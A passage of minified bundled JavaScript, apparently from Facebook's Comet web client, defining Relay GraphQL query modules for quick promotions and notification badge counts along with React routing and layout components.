            type: "CometQuickPromotionConsentUIFrameworkContextualConsentInterstitialRendererStrategy",
            abstractKey: null,
          };
        return {
          fragment: {
            argumentDefinitions: [],
            kind: "Fragment",
            metadata: null,
            name: "CometQuickPromotionInterstitialQuery",
            selections: [
              {
                alias: null,
                args: null,
                concreteType: "Viewer",
                kind: "LinkedField",
                name: "viewer",
                plural: !1,
                selections: [
                  {
                    alias: null,
                    args: a,
                    concreteType: "ViewerEligibleQuickPromotionsConnection",
                    kind: "LinkedField",
                    name: "eligible_promotions",
                    plural: !1,
                    selections: [
                      {
                        alias: null,
                        args: null,
                        concreteType: "QuickPromotion",
                        kind: "LinkedField",
                        name: "nodes",
                        plural: !0,
                        selections: [
                          {
                            alias: null,
                            args: null,
                            concreteType: "CometQuickPromotionSections",
                            kind: "LinkedField",
                            name: "comet_qp_sections",
                            plural: !1,
                            selections: [
                              {
                                alias: null,
                                args: b,
                                concreteType: null,
                                kind: "LinkedField",
                                name: "renderer_strategy",
                                plural: !1,
                                selections: [c, d, e, f],
                                storageKey:
                                  'renderer_strategy(supported:"4jMkec")',
                              },
                            ],
                            storageKey: null,
                          },
                        ],
                        storageKey: null,
                      },
                    ],
                    storageKey:
                      'eligible_promotions(surface_nux_id:3394,trigger:"NEWSFEED")',
                  },
                ],
                storageKey: null,
              },
            ],
            type: "Query",
            abstractKey: null,
          },
          kind: "Request",
          operation: {
            argumentDefinitions: [],
            kind: "Operation",
            name: "CometQuickPromotionInterstitialQuery",
            selections: [
              {
                alias: null,
                args: null,
                concreteType: "Viewer",
                kind: "LinkedField",
                name: "viewer",
                plural: !1,
                selections: [
                  {
                    alias: null,
                    args: a,
                    concreteType: "ViewerEligibleQuickPromotionsConnection",
                    kind: "LinkedField",
                    name: "eligible_promotions",
                    plural: !1,
                    selections: [
                      {
                        alias: null,
                        args: null,
                        concreteType: "QuickPromotion",
                        kind: "LinkedField",
                        name: "nodes",
                        plural: !0,
                        selections: [
                          {
                            alias: null,
                            args: null,
                            concreteType: "CometQuickPromotionSections",
                            kind: "LinkedField",
                            name: "comet_qp_sections",
                            plural: !1,
                            selections: [
                              {
                                alias: null,
                                args: b,
                                concreteType: null,
                                kind: "LinkedField",
                                name: "renderer_strategy",
                                plural: !1,
                                selections: [
                                  {
                                    alias: null,
                                    args: null,
                                    kind: "ScalarField",
                                    name: "__typename",
                                    storageKey: null,
                                  },
                                  c,
                                  d,
                                  e,
                                  f,
                                ],
                                storageKey:
                                  'renderer_strategy(supported:"4jMkec")',
                              },
                            ],
                            storageKey: null,
                          },
                          {
                            alias: null,
                            args: null,
                            kind: "ScalarField",
                            name: "id",
                            storageKey: null,
                          },
                        ],
                        storageKey: null,
                      },
                    ],
                    storageKey:
                      'eligible_promotions(surface_nux_id:3394,trigger:"NEWSFEED")',
                  },
                ],
                storageKey: null,
              },
            ],
          },
          params: {
            id: "6908819175900241",
            metadata: {},
            name: "CometQuickPromotionInterstitialQuery",
            operationKind: "query",
            text: null,
          },
        };
      })();
      b("relay-runtime").PreloadableQueryRegistry.set(a.params.id, a);
      e.exports = a;
    },
    null
  );
  __d(
    "CometQuickPromotionServerDrivenPromptRendererStrategy_quickPromotion.graphql",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      a = {
        argumentDefinitions: [],
        kind: "Fragment",
        metadata: null,
        name: "CometQuickPromotionServerDrivenPromptRendererStrategy_quickPromotion",
        selections: [
          {
            alias: null,
            args: null,
            concreteType: "XFBActorGatewayIXTCompatibleScreenPayload",
            kind: "LinkedField",
            name: "ixt_schema_compatible_enrollment_screen_payload",
            plural: !1,
            selections: [
              {
                alias: null,
                args: null,
                concreteType: null,
                kind: "LinkedField",
                name: "screen",
                plural: !1,
                selections: [
                  {
                    args: null,
                    kind: "FragmentSpread",
                    name: "CIXFacebookScreensRenderer_screen",
                  },
                ],
                storageKey: null,
              },
              {
                alias: null,
                args: null,
                kind: "ScalarField",
                name: "presentation_style",
                storageKey: null,
              },
            ],
            storageKey: null,
          },
        ],
        type: "CometQuickPromotionServerDrivenPromptRendererStrategy",
        abstractKey: null,
      };
      e.exports = a;
    },
    null
  );
  __d(
    "useCometMetaManagerBadgeCountQuery_facebookRelayOperation",
    [],
    function (a, b, c, d, e, f) {
      e.exports = "5191066640924457";
    },
    null
  );
  __d(
    "useCometMetaManagerBadgeCountQuery.graphql",
    ["useCometMetaManagerBadgeCountQuery_facebookRelayOperation"],
    function (a, b, c, d, e, f) {
      "use strict";
      a = (function () {
        var a = [
            { defaultValue: null, kind: "LocalArgument", name: "environment" },
          ],
          c = [
            {
              alias: null,
              args: null,
              concreteType: "Viewer",
              kind: "LinkedField",
              name: "viewer",
              plural: !1,
              selections: [
                {
                  alias: null,
                  args: [
                    {
                      kind: "Variable",
                      name: "environment",
                      variableName: "environment",
                    },
                  ],
                  kind: "ScalarField",
                  name: "notifications_unseen_count",
                  storageKey: null,
                },
                {
                  alias: null,
                  args: null,
                  concreteType: "ViewerMessageThreadsConnection",
                  kind: "LinkedField",
                  name: "message_threads",
                  plural: !1,
                  selections: [
                    {
                      alias: null,
                      args: null,
                      kind: "ScalarField",
                      name: "unseen_count",
                      storageKey: null,
                    },
                  ],
                  storageKey: null,
                },
              ],
              storageKey: null,
            },
          ];
        return {
          fragment: {
            argumentDefinitions: a,
            kind: "Fragment",
            metadata: null,
            name: "useCometMetaManagerBadgeCountQuery",
            selections: c,
            type: "Query",
            abstractKey: null,
          },
          kind: "Request",
          operation: {
            argumentDefinitions: a,
            kind: "Operation",
            name: "useCometMetaManagerBadgeCountQuery",
            selections: c,
          },
          params: {
            id: b("useCometMetaManagerBadgeCountQuery_facebookRelayOperation"),
            metadata: {},
            name: "useCometMetaManagerBadgeCountQuery",
            operationKind: "query",
            text: null,
          },
        };
      })();
      e.exports = a;
    },
    null
  );
  __d(
    "AFXPresentationStyles",
    [],
    function (a, b, c, d, e, f) {
      a = Object.freeze({
        BOTTOM_SHEET: 1,
        FULL_SCREEN: 2,
        FULL_SCREEN_MODAL: 3,
        FLEXIBLE_HEIGHT_BOTTOM_SHEET: 4,
        DIALOG: 5,
        NON_DISMISSIBLE_DIALOG: 6,
        NON_DISMISSIBLE_FULL_SCREEN: 7,
      });
      f["default"] = a;
    },
    66
  );
  __d(
    "QuickPromotionIxtMigrationDebugFalcoEvent",
    ["FalcoLoggerInternal", "getFalcoLogPolicy_DO_NOT_USE"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      a = c("getFalcoLogPolicy_DO_NOT_USE")("5150");
      b = d("FalcoLoggerInternal").create(
        "quick_promotion_ixt_migration_debug",
        a
      );
      e = b;
      g["default"] = e;
    },
    98
  );
  __d(
    "CometActorGatewayExperienceSubscription",
    [
      "CometActorGatewayExperienceSubscription.graphql",
      "CometRelay",
      "QuickPromotionIxtMigrationDebugFalcoEvent",
      "UfixGatewayLoggingUtils",
      "WebPixelRatio",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i =
          h !== void 0
            ? h
            : (h = b("CometActorGatewayExperienceSubscription.graphql"));
      function a(a) {
        var b = a.environment,
          c = a.input,
          e = a.onCompleted;
        a = a.onError;
        var f = function (a) {
          var b = a.getRootField("actor_gateway_experience_subscribe");
          if (b == null) return;
          var c = b.getLinkedRecord("quick_promotion"),
            d = b.getLinkedRecord("screen");
          if (c != null) {
            k(c);
            c =
              (c = c.getLinkedRecord("comet_qp_sections")) == null
                ? void 0
                : (c = c.getLinkedRecord(
                    'renderer_strategy(supported:"4vG8Rw")'
                  )) == null
                ? void 0
                : (c = c.getLinkedRecord(
                    "ixt_schema_compatible_enrollment_screen_payload"
                  )) == null
                ? void 0
                : c.getLinkedRecord("screen");
            if (c != null) {
              var e = a
                .getRoot()
                .getLinkedRecord("xfb_actor_gateway_open_experience");
              e == null &&
                (j(c),
                a
                  .getRoot()
                  .setLinkedRecord(b, "xfb_actor_gateway_open_experience"));
            }
          } else if (d != null) {
            e = a.getRoot().getLinkedRecord("xfb_actor_gateway_open_experience");
            e == null &&
              (j(d),
              a
                .getRoot()
                .setLinkedRecord(b, "xfb_actor_gateway_open_experience"));
          }
        };
        return d("CometRelay").requestSubscription(b, {
          onCompleted: e,
          onError: a,
          subscription: i,
          updater: f,
          variables: { input: c, scale: d("WebPixelRatio").get() },
        });
      }
      function j(a) {
        a = a.getValue("session_id");
        a != null &&
          d("UfixGatewayLoggingUtils").logAction(
            String(a),
            "afx_item_overview",
            "graphql_subscription_received"
          );
      }
      function k(a) {
        var b,
          d =
            (b =
              (b = a.getLinkedRecord("comet_qp_sections")) == null
                ? void 0
                : b.getDataID()) != null
              ? b
              : "",
          e =
            ((b = a.getLinkedRecord("comet_qp_sections")) == null
              ? void 0
              : b.getLinkedRecord('renderer_strategy(supported:"4vG8Rw")')) !=
            null
              ? "true"
              : "false";
        c("QuickPromotionIxtMigrationDebugFalcoEvent").log(function () {
          return {
            event: "quickPromotionRendererInfo",
            extra: { comet_qp_sections_id: d, is_renderer_strategy_valid: e },
          };
        });
      }
      g.subscription = i;
      g.subscribeToActorGatewayExperiences = a;
    },
    98
  );
  __d(
    "CometActorGatewayHandler",
    [
      "AFXFlowPresentationStyleContext",
      "AFXFlowTypeContext",
      "AFXPresentationStyles",
      "CometActorGatewayExperienceSubscription",
      "CometActorGatewayHandlerQuery.graphql",
      "CometPlaceholder.react",
      "CometQuickPromotionServerDrivenPromptRendererStrategy.react",
      "CometRelay",
      "CometRelayEnvironmentProvider",
      "CometSSRSuspendOnServer.react",
      "JSResource",
      "WebPixelRatio",
      "getJSEnumSafe",
      "lazyLoadComponent",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
        j = i || (i = d("react")),
        k = i.useEffect,
        l = c("lazyLoadComponent")(
          c("JSResource")("CIXWithScreen.react").__setRef(
            "CometActorGatewayHandler"
          )
        ),
        m = function () {},
        n = h !== void 0 ? h : (h = b("CometActorGatewayHandlerQuery.graphql"));
      function o() {
        var a,
          b = d("CometRelay").useLazyLoadQuery(
            n,
            { scale: d("WebPixelRatio").get() },
            { fetchPolicy: "network-only" }
          );
        a =
          (a = b.xfb_actor_gateway_open_experience) == null
            ? void 0
            : (a = a.quick_promotion) == null
            ? void 0
            : (a = a.comet_qp_sections) == null
            ? void 0
            : a.renderer_strategy;
        return a != null
          ? j.jsx(
              c("CometQuickPromotionServerDrivenPromptRendererStrategy.react"),
              { quickPromotion: a }
            )
          : j.jsx(p, { data: b });
      }
      o.displayName = o.name + " [from " + f.id + "]";
      function p(a) {
        var b;
        a = a.data;
        var e = d("CometRelay").useRelayEnvironment();
        k(
          function () {
            var a = d(
              "CometActorGatewayExperienceSubscription"
            ).subscribeToActorGatewayExperiences({ environment: e, input: {} });
            return a.dispose;
          },
          [e]
        );
        b =
          a == null
            ? void 0
            : (b = a.xfb_actor_gateway_open_experience) == null
            ? void 0
            : b.screen;
        if (b == null) return null;
        a =
          (a = c("getJSEnumSafe")(
            c("AFXPresentationStyles"),
            (a = a.xfb_actor_gateway_open_experience) == null
              ? void 0
              : a.presentation_style
          )) != null
            ? a
            : 5;
        var f = function () {
            d("CometRelay")
              .fetchQuery(e, n, { scale: d("WebPixelRatio").get() })
              .subscribe({ complete: m, start: m });
          },
          g = function () {
            d("CometRelay").commitLocalUpdate(e, function (a) {
              var b = a
                .getRoot()
                .getLinkedRecord("xfb_actor_gateway_open_experience");
              b != null && a["delete"](b.getDataID());
              f();
            });
          };
        return j.jsx(d("AFXFlowTypeContext").AFXFlowTypeContext.Provider, {
          value: d("AFXFlowTypeContext").AFXFlowType.GATEWAY,
          children: j.jsx(
            d("AFXFlowPresentationStyleContext").AFXFlowPresentationStyleContext
              .Provider,
            { value: a, children: j.jsx(l, { initialScreen: b, onClose: g }) }
          ),
        });
      }
      p.displayName = p.name + " [from " + f.id + "]";
      function a() {
        return j.jsx(c("CometPlaceholder.react"), {
          fallback: null,
          children: j.jsx(c("CometRelayEnvironmentProvider"), {
            children: j.jsx(c("CometSSRSuspendOnServer.react"), {
              children: j.jsx(o, {}),
            }),
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g.GATEWAY_ENROLLMENT_QUERY = n;
      g.CometActorGatewayHandler = a;
    },
    98
  );
  __d(
    "CometQuickPromotionServerDrivenPromptRendererStrategy.react",
    [
      "AFXFlowPresentationStyleContext",
      "AFXFlowTypeContext",
      "AFXPresentationStyles",
      "CometActorGatewayExperienceSubscription",
      "CometActorGatewayHandler",
      "CometPlaceholder.react",
      "CometQuickPromotionServerDrivenPromptRendererStrategy_quickPromotion.graphql",
      "CometRelay",
      "CometRelayEnvironmentProvider",
      "JSResource",
      "WebPixelRatio",
      "getJSEnumSafe",
      "lazyLoadComponent",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
        j = i || (i = d("react")),
        k = i.useEffect,
        l = function () {},
        m = c("lazyLoadComponent")(
          c("JSResource")("CIXWithScreen.react").__setRef(
            "CometQuickPromotionServerDrivenPromptRendererStrategy.react"
          )
        );
      function a(a) {
        var e;
        a = a.quickPromotion;
        a = d("CometRelay").useFragment(
          h !== void 0
            ? h
            : (h = b(
                "CometQuickPromotionServerDrivenPromptRendererStrategy_quickPromotion.graphql"
              )),
          a
        );
        var f = d("CometRelay").useRelayEnvironment();
        k(
          function () {
            var a = d(
              "CometActorGatewayExperienceSubscription"
            ).subscribeToActorGatewayExperiences({ environment: f, input: {} });
            return a.dispose;
          },
          [f]
        );
        e =
          a == null
            ? void 0
            : (e = a.ixt_schema_compatible_enrollment_screen_payload) == null
            ? void 0
            : e.screen;
        if (e == null) return null;
        a =
          (a = c("getJSEnumSafe")(
            c("AFXPresentationStyles"),
            (a = a.ixt_schema_compatible_enrollment_screen_payload) == null
              ? void 0
              : a.presentation_style
          )) != null
            ? a
            : 5;
        var g = function () {
            d("CometRelay")
              .fetchQuery(
                f,
                d("CometActorGatewayHandler").GATEWAY_ENROLLMENT_QUERY,
                { scale: d("WebPixelRatio").get() }
              )
              .subscribe({ complete: l, start: l });
          },
          i = function () {
            d("CometRelay").commitLocalUpdate(f, function (a) {
              var b = a
                .getRoot()
                .getLinkedRecord(
                  "ixt_schema_compatible_enrollment_screen_payload"
                );
              b != null && a["delete"](b.getDataID());
              b = a
                .getRoot()
                .getLinkedRecord("xfb_actor_gateway_open_experience");
              b != null && a["delete"](b.getDataID());
              g();
            });
          };
        return j.jsx(c("CometPlaceholder.react"), {
          fallback: null,
          children: j.jsx(c("CometRelayEnvironmentProvider"), {
            children: j.jsx(d("AFXFlowTypeContext").AFXFlowTypeContext.Provider, {
              value: d("AFXFlowTypeContext").AFXFlowType.GATEWAY,
              children: j.jsx(
                d("AFXFlowPresentationStyleContext")
                  .AFXFlowPresentationStyleContext.Provider,
                { value: a, children: j.jsx(m, { initialScreen: e, onClose: i }) }
              ),
            }),
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometRootContainer.react",
    ["cr:1119068", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      c = h;
      var j = c.useEffect,
        k = c.useRef;
      function a(a) {
        a = a.children;
        var c = k(null);
        j(function () {
          b("cr:1119068") != null &&
            c.current != null &&
            b("cr:1119068").init(c.current);
          return function () {
            b("cr:1119068") != null && b("cr:1119068").clear();
          };
        }, []);
        return i.jsx("div", {
          className: "x78zum5 xdt5ytf x1n2onr6 x1ja2u2z",
          ref: c,
          children: a,
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometMainContentWrapper.react",
    [
      "BaseDocumentScrollView.react",
      "BaseViewportMarginsContext",
      "CometAppNavigationConstants",
      "CometContextualLayerAnchorRoot.react",
      "CometPlaceholder.react",
      "CometRootContainer.react",
      "CometRouterUIComponentContext",
      "gkx",
      "react",
      "stylex",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
        j = i || (i = d("react"));
      b = i;
      var k = b.useContext,
        l = b.useMemo,
        m = c("gkx")("8631"),
        n = {
          base: {
            display: "x78zum5",
            flexDirection: "xdt5ytf",
            position: "x1n2onr6",
            $$css: !0,
          },
          innerHiddenTopNav: { minHeight: "xg6iff7", top: "x13vifvy", $$css: !0 },
          innerHiddenTopNavDvh: {
            "@supports (min-height: 100dvh)_minHeight": "xippug5",
            $$css: !0,
          },
          innerHiddenTopNavWithFirstThatWorks: {
            minHeight: "x1wjobn4",
            top: "x13vifvy",
            $$css: !0,
          },
          innerWithTopNav: { minHeight: "xat3117", top: "xxzkxad", $$css: !0 },
          innerWithTopNavDvh: {
            "@supports (min-height: 100dvh)_minHeight": "x4m6w61",
            $$css: !0,
          },
          innerWithTopNavWithFirstThatWorks: {
            minHeight: "xpvvgw5",
            top: "xxzkxad",
            $$css: !0,
          },
        };
      function a(a) {
        var b = a.children,
          e = a.shouldRenderTopNav,
          f = e === void 0 ? !0 : e;
        e = a.shouldUseDvhMinHeight;
        e = e === void 0 ? !1 : e;
        a = babelHelpers.objectWithoutPropertiesLoose(a, [
          "children",
          "shouldRenderTopNav",
          "shouldUseDvhMinHeight",
        ]);
        var g = k(c("CometRouterUIComponentContext"));
        g = g.FallbackRoot;
        var i = l(
            function () {
              return {
                bottom: 0,
                left: 0,
                right: 0,
                top: f ? d("CometAppNavigationConstants").HEADER_HEIGHT : 0,
              };
            },
            [f]
          ),
          o =
            m === !0
              ? f
                ? n.innerWithTopNavWithFirstThatWorks
                : n.innerHiddenTopNavWithFirstThatWorks
              : void 0;
        e =
          m === !1
            ? [
                f ? n.innerWithTopNav : n.innerHiddenTopNav,
                e ? (f ? n.innerWithTopNavDvh : n.innerHiddenTopNavDvh) : void 0,
              ]
            : void 0;
        return j.jsx(
          c("BaseDocumentScrollView.react"),
          babelHelpers["extends"]({}, a, {
            children: j.jsx(c("CometRootContainer.react"), {
              children: j.jsx(c("BaseViewportMarginsContext").Provider, {
                value: i,
                children: j.jsx("div", {
                  className: (h || (h = c("stylex")))(n.base, o, e),
                  children: j.jsx(c("CometContextualLayerAnchorRoot.react"), {
                    children: j.jsx(c("CometPlaceholder.react"), {
                      fallback: g ? j.jsx(g, {}) : j.jsx("div", {}),
                      children: b,
                    }),
                  }),
                }),
              }),
            }),
          })
        );
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometContentWrapperContext",
    ["react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      a = h || d("react");
      b = a.createContext({ mainRoutesWrapper: void 0 });
      g["default"] = b;
    },
    98
  );
  __d(
    "getCometRouteActor",
    ["killswitch"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a, b) {
        var d = a.actorID;
        a = a.usePreviousActor;
        return a === !0 &&
          b != null &&
          b !== d &&
          !c("killswitch")("COMET_PREVIOUS_ACTOR_CARRYOVER")
          ? b
          : d;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometRouteActorProvider.react",
    [
      "Actor",
      "BaseActorProvider",
      "CometDOMOnlyBoundary.react",
      "CometErrorBoundary.react",
      "CometPlaceholder.react",
      "CometRouterUIComponentContext",
      "getCometEntityKey",
      "getCometRouteActor",
      "getCometRouteKey",
      "react",
      "useRouteReferrer",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react")),
        j = h.useContext;
      function k(a) {
        var b = a == null ? void 0 : a.entity_type;
        a = a == null ? void 0 : a.entity_id;
        return b != null && a != null ? b + ":" + a : null;
      }
      function a(a) {
        var b = a.children;
        a = a.route;
        var e = j(c("CometRouterUIComponentContext"));
        e = e.RouteActorToaster;
        var f = d("Actor").useActor();
        f = f[0];
        var g = c("useRouteReferrer")(),
          h = c("getCometEntityKey")(a);
        h = k(h);
        h = (h = h) != null ? h : c("getCometRouteKey")(a);
        g = c("getCometRouteActor")(a, g == null ? void 0 : g.actorID);
        g = (g = g) != null ? g : f;
        f = a.actorEnvironmentKey;
        return i.jsxs(d("BaseActorProvider").BaseActorProvider, {
          actorEnvironmentKey_DO_NOT_USE_UNLESS_YOU_KNOW_WHAT_YOU_ARE_DOING: f,
          initialActorID: g,
          scope: h,
          children: [
            b,
            e != null &&
              i.jsx(c("CometDOMOnlyBoundary.react"), {
                children: i.jsx(c("CometErrorBoundary.react"), {
                  children: i.jsx(c("CometPlaceholder.react"), {
                    fallback: null,
                    children: i.jsx(e, {}),
                  }),
                }),
              }),
          ],
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometRouteRootWrapper.react",
    [
      "CometBackupPlaceholder.react",
      "CometErrorBoundary.react",
      "CometPlaceholder.react",
      "CometRouterFocusRegion.react",
      "CometRouterUIComponentContext",
      "CometTransientDialogProvider.react",
      "deferredLoadComponent",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react")),
        j = h.useContext;
      function k(a) {
        a = a.deferredComponent;
        a = c("deferredLoadComponent")(a);
        return i.jsx(c("CometPlaceholder.react"), {
          fallback: null,
          children: i.jsx(a, {}),
        });
      }
      k.displayName = k.name + " [from " + f.id + "]";
      function a(a) {
        var b = a.children,
          d = a.isDialog;
        a = a.loadingLayoutType;
        var e = j(c("CometRouterUIComponentContext")),
          f = e.DialogErrorRoot,
          g = e.ErrorRoot,
          h = e.LoadingStates;
        e = e.RouterFocusRegion;
        e = (e = e) != null ? e : c("CometRouterFocusRegion.react");
        a = a ? ((h = h == null ? void 0 : h[a]) != null ? h : null) : null;
        h = i.jsx(e, { children: b });
        return i.jsx(c("CometErrorBoundary.react"), {
          context: { project: "router_comet_root" },
          fallback: function () {
            return d && f != null
              ? i.jsx(f, {})
              : i.jsx(k, { deferredComponent: g });
          },
          children: i.jsx(c("CometTransientDialogProvider.react"), {
            children: a
              ? i.jsx(c("CometPlaceholder.react"), {
                  fallback: i.jsx(a, {}),
                  children: h,
                })
              : i.jsx(c("CometBackupPlaceholder.react"), {
                  fallback: null,
                  children: h,
                }),
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometRouterRouteTimeSpentMetaDataContext",
    ["react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      a = h || d("react");
      b = a.createContext();
      g["default"] = b;
    },
    98
  );
  __d(
    "useCometRouteTimeSpentMetaData",
    ["CometRouterRouteTimeSpentMetaDataContext", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = (h || d("react")).useContext;
      function a() {
        var a = i(c("CometRouterRouteTimeSpentMetaDataContext"));
        return (a = a) != null ? a : null;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometRouteRootRenderer.react",
    [
      "BootloaderResource",
      "CometRouteParams",
      "CometRouteRootWrapper.react",
      "CometRouterRefreshKeyContext",
      "gkx",
      "react",
      "react-relay/relay-hooks/LazyLoadEntryPointContainer_DEPRECATED.react",
      "useCometRelayEntrypointContextualEnvironmentProvider",
      "useCometRouteTimeSpentMetaData",
      "useRoutePassthroughProps",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useContext,
        k = b.useMemo;
      function l(a, b) {
        return babelHelpers["extends"]({}, a, {
          getPreloadProps: function (c) {
            var d = a.getPreloadProps(c);
            if (d.queries == null) return d;
            var e = {};
            if (d.entryPoints) {
              var f = d.entryPoints;
              Object.keys(f).forEach(function (a) {
                var c;
                ((c = f[a]) == null ? void 0 : c.entryPoint)
                  ? (e[a] = babelHelpers["extends"]({}, f[a], {
                      entryPoint: l(f[a].entryPoint, b),
                    }))
                  : (e[a] = f[a]);
              });
            }
            var g = {};
            d.queries &&
              Object.keys(d.queries).forEach(function (a) {
                var c;
                g[a] = babelHelpers["extends"](
                  {},
                  (c = d.queries) == null ? void 0 : c[a],
                  {
                    options: babelHelpers["extends"](
                      {},
                      (c = d.queries) == null ? void 0 : c[a].options,
                      { fetchKey: b, fetchPolicy: "network-only" }
                    ),
                  }
                );
              });
            return babelHelpers["extends"]({}, d, { entryPoints: e, queries: g });
          },
        });
      }
      function m(a) {
        var b = a.children;
        a.isDialog;
        a.loadingLayoutType;
        var e = a.refreshBehavior,
          f = a.routeProps,
          g = a.entryPoint,
          h = a.resource,
          m = c("useCometRelayEntrypointContextualEnvironmentProvider")(),
          n = d("CometRouteParams").useRouteParams(),
          o = c("useRoutePassthroughProps")(),
          p = c("useCometRouteTimeSpentMetaData")(),
          q = k(
            function () {
              return {
                passthroughProps: o,
                routeParams: n,
                routeProps: f,
                timeSpentMetaData: p,
              };
            },
            [o, n, f, p]
          ),
          r = k(
            function () {
              return {
                children: b,
                routeParams: n,
                routeProps: f,
                timeSpentMetaData: p,
              };
            },
            [b, n, f, p]
          ),
          s = j(c("CometRouterRefreshKeyContext"));
        return k(
          function () {
            if (g) {
              var a = d("BootloaderResource").read(g);
              return i.jsx(
                c(
                  "react-relay/relay-hooks/LazyLoadEntryPointContainer_DEPRECATED.react"
                ),
                {
                  entryPoint:
                    e === "none" || s == null || !c("gkx")("1352928")
                      ? a
                      : l(a, s),
                  entryPointParams: q,
                  environmentProvider: m,
                  props: r,
                }
              );
            } else {
              a = d("BootloaderResource").read(h);
              return i.jsx(a, { children: b, routeProps: f });
            }
          },
          [b, r, g, q, m, e, s, h, f]
        );
      }
      m.displayName = m.name + " [from " + f.id + "]";
      function a(a) {
        return i.jsx(c("CometRouteRootWrapper.react"), {
          isDialog: a.isDialog,
          loadingLayoutType: a.loadingLayoutType,
          children: i.jsx(
            m,
            babelHelpers["extends"]({}, a, { routeProps: a.props })
          ),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      e = i.memo(a);
      g["default"] = e;
    },
    98
  );
  __d(
    "CometRouterRootContextFactory.react",
    [
      "CometPassiveRouterRouteTracePolicyContext",
      "CometRoutePassthroughPropsContext",
      "CometRouteProductAttributionContext",
      "CometRouteReferrerContext",
      "CometRouterRenderTypeContext",
      "CometRouterRouteContext",
      "CometRouterRouteMutableStateContext",
      "CometRouterRouteTimeSpentMetaDataContext",
      "CometRouterRouteTracePolicyContext",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useCallback,
        k = b.useContext,
        l = b.useInsertionEffect,
        m = b.useRef;
      function a(a) {
        var b,
          d = a.children,
          e = a.renderType;
        a = a.routeInfo;
        var f = k(c("CometRouterRouteTracePolicyContext")),
          g = (b = a.route.tracePolicy) != null ? b : f,
          h = m(g);
        l(
          function () {
            h.current = g;
          },
          [g]
        );
        b = j(
          function () {
            return h.current;
          },
          [h]
        );
        return i.jsx(c("CometRouterRenderTypeContext").Provider, {
          value: e,
          children: i.jsx(c("CometRouterRouteContext").Provider, {
            value: a.route,
            children: i.jsx(c("CometRoutePassthroughPropsContext").Provider, {
              value: a.passthroughProps,
              children: i.jsx(c("CometRouteProductAttributionContext").Provider, {
                value: a.productAttribution,
                children: i.jsx(c("CometRouteReferrerContext").Provider, {
                  value: a.referrer,
                  children: i.jsx(
                    c("CometRouterRouteMutableStateContext").Provider,
                    {
                      value: a.mutableState,
                      children: i.jsx(
                        c("CometRouterRouteTimeSpentMetaDataContext").Provider,
                        {
                          value: a.timeSpentMetaData,
                          children: i.jsx(
                            c("CometRouterRouteTracePolicyContext").Provider,
                            {
                              value: g,
                              children: i.jsx(
                                c("CometPassiveRouterRouteTracePolicyContext")
                                  .Provider,
                                { value: b, children: d }
                              ),
                            }
                          ),
                        }
                      ),
                    }
                  ),
                }),
              }),
            }),
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometRouteRenderer.react",
    [
      "CometRouteActorProvider.react",
      "CometRouteRootRenderer.react",
      "CometRouterDispatcherContextFactory.react",
      "CometRouterRefreshKeyContext",
      "CometRouterRootContextFactory.react",
      "CometScrollAnchorContext",
      "react",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react")),
        j = h.useMemo;
      function a(a) {
        var b,
          d = a.children,
          e = a.renderType;
        a = a.routeInfo;
        var f = a.refreshKey,
          g = a.route,
          h = g.hostableView,
          k = g.refreshBehavior,
          l = g.rootView,
          m = g.tracePolicy,
          n = g.url,
          o =
            e === "main"
              ? "rootView"
              : e === "hosted"
              ? "hostedView"
              : "pushView",
          p = o === "hostedView" && h != null;
        h = p && h ? h : l;
        l = g.params;
        var q =
          (b = l == null ? void 0 : l.reply_comment_id) != null
            ? b
            : l == null
            ? void 0
            : l.comment_id;
        b = j(
          function () {
            return typeof q === "string"
              ? { key: "ufi-comment", value: q }
              : null;
          },
          [q]
        );
        return i.jsx(c("CometRouterRootContextFactory.react"), {
          renderType: e,
          routeInfo: a,
          children: i.jsx(c("CometRouterDispatcherContextFactory.react"), {
            from: p ? "hostedView" : o,
            tracePolicy: m,
            url: n,
            children: i.jsx(c("CometScrollAnchorContext").Provider, {
              value: b,
              children: i.jsx(c("CometRouterRefreshKeyContext").Provider, {
                value: (l = f) != null ? l : null,
                children: i.jsx(c("CometRouteActorProvider.react"), {
                  route: g,
                  children: i.jsx(
                    c("CometRouteRootRenderer.react"),
                    babelHelpers["extends"](
                      {
                        isDialog: a.route.routeType === "routable_dialog",
                        loadingLayoutType: a.route.loadingLayoutType,
                        refreshBehavior: k,
                      },
                      h,
                      { children: d }
                    )
                  ),
                }),
              }),
            }),
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
